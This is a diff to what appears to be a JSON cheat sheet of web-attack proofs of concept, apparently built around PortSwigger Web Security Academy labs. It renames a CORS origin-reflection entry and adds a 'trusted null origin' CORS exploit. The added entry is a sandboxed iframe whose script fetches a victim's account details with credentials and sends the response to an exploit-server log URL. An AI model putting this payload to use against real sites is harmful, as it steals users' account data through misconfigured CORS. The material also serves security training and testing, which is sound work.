@@ -34,7 +34,7 @@
         ]
     },
     {
-        "title": "1. CORS VULNERABILITY WITH BASIC ORIGIN REFLECTION",
+        "title": "1. CORS: BASIC ORIGIN REFLECTION",
         "subtitle": "POC for CORS vulnerability with basic origin reflection <br> -generate poc with https://guptashubham.com/resources/cors-poc-generator/",
         "commands": [
             "&lt;html&gt;",
@@ -55,6 +55,22 @@
             "  &lt;/script&gt;",
             "&lt;/body&gt;",
             "&lt;/html&gt;"
+        ]
+    },
+    {
+        "title": "CORS:trusted null origin",
+        "subtitle": "insecure  CORS configuration where the website trusts the \"null\" origin js code",
+        "commands": [
+            "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>",
+            "    var req = new XMLHttpRequest();",
+            "    req.onload = reqListener;",
+            "    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);",
+            "    req.withCredentials = true;",
+            "    req.send();",
+            "    function reqListener() {",
+            "        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);",
+            "    };",
+            "</script>\"></iframe>"
         ]
     },
     {
